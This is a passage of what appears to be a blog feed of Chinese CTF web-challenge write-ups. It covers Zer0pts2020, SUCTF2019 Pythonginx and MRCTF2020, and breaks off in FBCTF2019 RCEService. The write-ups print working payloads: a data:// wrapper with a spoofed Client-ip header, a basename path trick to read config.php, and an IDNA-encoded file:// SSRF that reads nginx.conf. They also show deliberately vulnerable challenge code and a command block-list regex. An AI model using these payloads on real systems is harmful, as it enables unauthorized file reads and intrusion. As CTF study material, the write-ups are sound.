class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br> <br>cstr = <span class="hljs-string">&quot;flag.php&quot;</span><br>tmp = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(cstr[i]) - i * <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cstr)))<br> <br><span class="hljs-built_in">print</span>(base64.b64encode(tmp.encode()))<br></code></pre></td></tr></table></figure><p>得到的值</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">ZmpdYSZmXGI</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">url/secrettw.php?<span class="hljs-attribute">2333</span>=data://text/plain,todat is a happy day&amp;<span class="hljs-attribute">file</span>=ZmpdYSZmXGI=<br><br>hackbar：<br>添加Client-ip头的值为127.0.0.1<br></code></pre></td></tr></table></figure><p>注意这里记得把Merak传参去掉，不然会触发die</p><p>拿到flag</p><p><img src="/../image/MRCTF2020-%E5%A5%97%E5%A8%83-6.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> +%0a绕过正则 </tag>
            
            <tag> jsfuck编码 </tag>
            
            <tag> Client-ip头绕过 </tag>
            
            <tag> data://伪协议 </tag>
            
            <tag> 逆推加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zer0pts2020-Can+you+guess+it</title>
      <link href="/2025/03/31/Zer0pts2020-Can-you-guess-it/"/>
      <url>/2025/03/31/Zer0pts2020-Can-you-guess-it/</url>
      
        <content type="html"><![CDATA[<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="Zer0pts2020-Can+you+guess+it"></a>Zer0pts2020-Can+you+guess+it</h1><p><img src="/../image/Zer0pts2020-Can-you-guess-it-1.png"></p><p>点一下source出现源码</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-comment">// FLAG is defined in config.php</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="language-php">  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="language-php">  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="language-php">  <span class="hljs-keyword">exit</span>();</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-variable">$secret</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">64</span>));</span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="language-php">  <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];</span><br><span class="language-php">  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">hash_equals</span>(<span class="hljs-variable">$secret</span>, <span class="hljs-variable">$guess</span>)) &#123;</span><br><span class="language-php">    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="language-php">  &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-php">    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;</span><br><span class="language-php">  &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Can you guess it?<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Can you guess it?<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>If your guess is correct, I&#x27;ll give you the flag.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;?source&quot;</span>&gt;</span>Source<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$message</span>)) &#123; <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><span class="language-php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-variable">$message</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> &#125; <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;guess&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>代码审计</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="SERVER-‘PHP-SELF’"><a href="#SERVER-‘PHP-SELF’" class="headerlink" title="$_SERVER[‘PHP_SELF’]"></a>$_SERVER[‘PHP_SELF’]</h3><p>当前执行脚本的文件名，相对于网站根目录。<br>举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/aaa/index.php?a=1&amp;b=32</span><br><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] = <span class="hljs-string">&quot;/aaa/index.php&quot;</span>;<br></code></pre></td></tr></table></figure><hr><p><strong>正则表达式</strong></p><p>‘&#x2F;config.php&#x2F;*$&#x2F;i’：过滤config.php，且大小写不敏感</p><hr><h3 id="basename函数"><a href="#basename函数" class="headerlink" title="basename函数"></a>basename函数</h3><p>basename() 函数可以返回路径的最后一部分名称，它会去掉文件名]开头的非ASCII值<br>如果目录末尾是不可见值，会返回上一级目录<br>此处配合文件读取可被利用</p><hr><h3 id="bin2hex-random-bytes-64"><a href="#bin2hex-random-bytes-64" class="headerlink" title="bin2hex(random_bytes(64));"></a>bin2hex(random_bytes(64));</h3><p>这一行代码将生成的随机字节序列转换为十六进制字符串<br>如果传入的guess的值跟这个随机生成的值相同，显示flag<br>这里生成很长的一段字符串，每次变化，所以无法利用此处</p><h3 id="PHP-URL解析"><a href="#PHP-URL解析" class="headerlink" title="PHP URL解析"></a>PHP URL解析</h3><p>我们可以利用basename()函数，末尾如果是不可见值会返回上一级目录的特性来解这题，</p><p><strong>PHP在根据URI解析到对应文件后会忽略掉URL中多余的部分</strong></p><p>我们需要访问的页面是index.php，末尾是config.php</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">payload：/<span class="hljs-keyword">index</span>.php/config.php/<span class="hljs-title function_">%ff</span><br></code></pre></td></tr></table></figure><p>再点击source即可看到flag</p><p>这里主要是利用basename返回上一级目录的特性返回config.php，然后通过highlight_file来高亮显示</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> $_SERVER[‘PHP_SELF’] </tag>
            
            <tag> basename()函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019-Pythonginx</title>
      <link href="/2025/03/30/SUCTF2019-Pythonginx/"/>
      <url>/2025/03/30/SUCTF2019-Pythonginx/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF2019-Pythonginx"><a href="#SUCTF2019-Pythonginx" class="headerlink" title="SUCTF2019-Pythonginx"></a>SUCTF2019-Pythonginx</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/124725500?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-124725500-blog-125823231.235%5Ev43%5Epc_blog_bottom_relevance_base4&spm=1001.2101.3001.4242.1&utm_relevant_index=2">参考文章</a></p><p>源码：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]) <br>def <span class="hljs-built_in">getUrl</span>(): <br>    url = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>) <br>    host = parse.<span class="hljs-built_in">urlparse</span>(url).hostname  #解析主机名<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>: <br>        return <span class="hljs-string">&quot;我扌 your problem? 111&quot;</span> <br>    parts = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">urlsplit</span>(url)) <br>    host = parts[<span class="hljs-number">1</span>] <br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>: <br>        return <span class="hljs-string">&quot;我扌 your problem? 222 &quot;</span> + host <br>    newhost = [] <br>    for h in host.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>): <br>        newhost.<span class="hljs-built_in">append</span>(h.<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;idna&#x27;</span>).<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) <br>        parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-built_in">join</span>(newhost) #去掉 url 中的空格 <br>        finalUrl = <span class="hljs-built_in">urlunsplit</span>(parts).<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>] # 将主机名再次组合成 url<br>        host = parse.<span class="hljs-built_in">urlparse</span>(finalUrl).hostname <br>        if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>: <br>            return urllib.request.<span class="hljs-built_in">urlopen</span>(finalUrl).<span class="hljs-built_in">read</span>() <br>        <span class="hljs-attribute">else</span>: <br>            return <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span> <br><br></code></pre></td></tr></table></figure><p>我们需要提交一个url，用来读取服务器端任意文件，需要绕过前面两个if，进入第三个if<br>三个if判断的都是host是否等于’suctf.cc’</p><p>首先需要了解一些</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="urlsplit"><a href="#urlsplit" class="headerlink" title="urlsplit()"></a>urlsplit()</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">urllib.parse.urlsplit(url)：这个函数将一个 <span class="hljs-built_in">URL</span> 解析为以下五个部分：<br>    scheme：<span class="hljs-built_in">URL</span> 的协议部分，如 <span class="hljs-keyword">http</span>, <span class="hljs-keyword">https</span> 等。<br>    netloc：<span class="hljs-built_in">URL</span> 的网络位置部分，通常是主机名和端口号的组合。<br>    path：<span class="hljs-built_in">URL</span> 的路径部分。<br>    query：<span class="hljs-built_in">URL</span> 的查询参数部分。<br>    fragment：<span class="hljs-built_in">URL</span> 的片段部分，即在页面内部定位用的锚点。<br>    <br>例如，对于 <span class="hljs-built_in">URL</span> <span class="hljs-string">&quot;https://www.example.com/path/to/resource?query=1#fragment&quot;</span>，urlsplit 将解析为：<br>    scheme 是 <span class="hljs-string">&quot;https&quot;</span><br>    netloc 是 <span class="hljs-string">&quot;www.example.com&quot;</span><br>    path 是 <span class="hljs-string">&quot;/path/to/resource&quot;</span><br>    query 是 <span class="hljs-string">&quot;query=1&quot;</span><br>    fragment 是 <span class="hljs-string">&quot;fragment&quot;</span><br><br></code></pre></td></tr></table></figure><h3 id="nginx文件位置"><a href="#nginx文件位置" class="headerlink" title="nginx文件位置"></a>nginx文件位置</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">配置文件存放目录：<span class="hljs-regexp">/etc/</span>nginx<br>主配置文件：<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>管理脚本：<span class="hljs-regexp">/usr/</span>lib64<span class="hljs-regexp">/systemd/</span>system/nginx.service<br>模块：<span class="hljs-regexp">/usr/</span>lisb64<span class="hljs-regexp">/nginx/m</span>odules<br>应用程序：<span class="hljs-regexp">/usr/</span>sbin/nginx<br>程序默认存放位置：<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<br>日志默认存放位置：<span class="hljs-regexp">/var/</span>log/nginx<br>配置文件目录为：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf<br></code></pre></td></tr></table></figure><h3 id="idna"><a href="#idna" class="headerlink" title="idna"></a>idna</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dna 国际化域名应用，国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以<br>ASCII字符串存储。<br>.<br>℆这个字符,如果使用python3进行idna编码的话<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(‘℆’.encode(‘idna’)</span></span>)<br>结果<br>b’c/u’<br>如果再使用utf-<span class="hljs-number">8</span>进行解码的话<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b’c/u’.decode(‘utf-<span class="hljs-number">8</span>’)</span></span>)<br>结果<br>c/u<br>通过这种方法可以绕过本题<br></code></pre></td></tr></table></figure><hr><p>所以<br>我们可以利用python3进行idna编码这一特性 对配置文件目录进行访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">getUrl?url=file:<span class="hljs-regexp">//</span>suctf.c℆sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br></code></pre></td></tr></table></figure><p>查到&#x2F;fffffflag文件</p><hr><p>访问 flag<br>对 ℆ 进行 url编码 <code>%E2%84%86</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">file:</span>//suctf.<span class="hljs-keyword">c</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%84</span><span class="hljs-variable">%86</span>sr/fffffflag<br></code></pre></td></tr></table></figure><p>还能用脚本爆破能够encode成c的特殊字符</p><p>大佬脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_unicode</span>():<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):<br>        uni=<span class="hljs-built_in">chr</span>(x)<br>        url=<span class="hljs-string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(uni)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> getUrl(url):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;str: &quot;</span>+uni+<span class="hljs-string">&#x27; unicode: \\u&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(x))[<span class="hljs-number">2</span>:])<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>(<span class="hljs-params">url</span>):<br>    url = url<br>    host = parse.urlparse(url).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))<br>    host = parts[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    newhost = []<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host = parse.urlparse(finalUrl).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    get_unicode()<br><br><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">爆破出</span><br><span class="hljs-attr">str:</span> <span class="hljs-string">ℂ</span> <span class="hljs-attr">unicode:</span> <span class="hljs-string">\u2102</span><br><span class="hljs-attr">str:</span> <span class="hljs-string">ℭ</span> <span class="hljs-attr">unicode:</span> <span class="hljs-string">\u212d</span><br><span class="hljs-attr">str:</span> <span class="hljs-string">Ⅽ</span> <span class="hljs-attr">unicode:</span> <span class="hljs-string">\u216d</span><br><span class="hljs-attr">str:</span> <span class="hljs-string">ⅽ</span> <span class="hljs-attr">unicode:</span> <span class="hljs-string">\u217d</span><br><span class="hljs-attr">str:</span> <span class="hljs-string">Ⓒ</span> <span class="hljs-attr">unicode:</span> <span class="hljs-string">\u24b8</span><br><span class="hljs-attr">str:</span> <span class="hljs-string">ⓒ</span> <span class="hljs-attr">unicode:</span> <span class="hljs-string">\u24d2</span><br><span class="hljs-attr">str:</span> <span class="hljs-string">Ｃ</span> <span class="hljs-attr">unicode:</span> <span class="hljs-string">\uff23</span><br><span class="hljs-attr">str:</span> <span class="hljs-string">ｃ</span> <span class="hljs-attr">unicode:</span> <span class="hljs-string">\uff43</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> idna编码特性 </tag>
            
            <tag> python代码审计 </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FBCTF2019-RCEService1</title>
      <link href="/2025/03/30/FBCTF2019-RCEService1/"/>
      <url>/2025/03/30/FBCTF2019-RCEService1/</url>
      
        <content type="html"><![CDATA[<h1 id="FBCTF2019-RCEService1"><a href="#FBCTF2019-RCEService1" class="headerlink" title="FBCTF2019-RCEService1"></a>FBCTF2019-RCEService1</h1><p>源码：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs coq">&lt;?php<br>putenv(&#x27;PATH=/home/rceservice/jail&#x27;);<br><span class="hljs-keyword">if</span> (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;<br>  $json = $_REQUEST[&#x27;cmd&#x27;];<br>  <br>  <span class="hljs-keyword">if</span> (!is_string($json)) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; elseif (preg_match(&#x27;/^.*(alias|<span class="hljs-type">bg</span>|<span class="hljs-type">bind</span>|<span class="hljs-type">break</span>|<span class="hljs-type">builtin</span>|<span class="hljs-type">case</span>|<span class="hljs-type">cd</span>|<span class="hljs-type">command</span>|<span class="hljs-type">compgen</span>|<span class="hljs-type">complete</span>|<span class="hljs-type">continue</span>|<span class="hljs-type">declare</span>|<span class="hljs-type">dirs</span>|<span class="hljs-type">disown</span>|<span class="hljs-type">echo</span>|<span class="hljs-type">enable</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">exec</span>|<span class="hljs-type">exit</span>|<span class="hljs-type">export</span>|<span class="hljs-type">fc</span>|<span class="hljs-type">fg</span>|<span class="hljs-type">getopts</span>|<span class="hljs-type">hash</span>|<span class="hljs-type">help</span>|<span class="hljs-type">history</span>|<span class="hljs-type">if</span>|<span class="hljs-type">jobs</span>|<span class="hljs-type">kill</span>|<span class="hljs-type">let</span>|<span class="hljs-type">local</span>|<span class="hljs-type">logout</span>|<span class="hljs-type">popd</span>|<span class="hljs-type">printf</span>|<span class="hljs-type">pushd</span>|<span class="hljs-type">pwd</span>|<span class="hljs-type">read</span>|<span class="hljs-type">readonly</span>|<span class="hljs-type">return</span>|<span class="hljs-type">set</span>|<span class="hljs-type">shift</span>|<span class="hljs-type">shopt</span>|<span class="hljs-type">source</span>|<span class="hljs-type">suspend</span>|<span class="hljs-type">test</span>|<span class="hljs-type">times</span>|<span class="hljs-type">trap</span>|<span class="hljs-type">type</span>|<span class="hljs-type">typeset</span>|<span class="hljs-type">ulimit</span>|<span class="hljs-type">umask</span>|<span class="hljs-type">unalias</span>|<span class="hljs-type">unset</span>|<span class="hljs-type">until</span>|<span class="hljs-type">wait</span>|<span class="hljs-type">while</span>|<span class="hljs-type">[\x00</span>-\x1FA-Z0<span class="hljs-number">-9</span>!#-\/;-@\[-`|<span class="hljs-type">~\x7F</span>]+).*$/&#x27;, $json)) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;;<br>    $cmd = json_decode($json, true)[&#x27;cmd&#x27;];<br>    <span class="hljs-keyword">if</span> ($cmd !== NULL) &#123;<br>      system($cmd);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      echo &#x27;Invalid input&#x27;;<br>    &#125;<br>    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>代码中$cmd &#x3D; json_decode($json, true)[‘cmd’];<br>json_decode(): 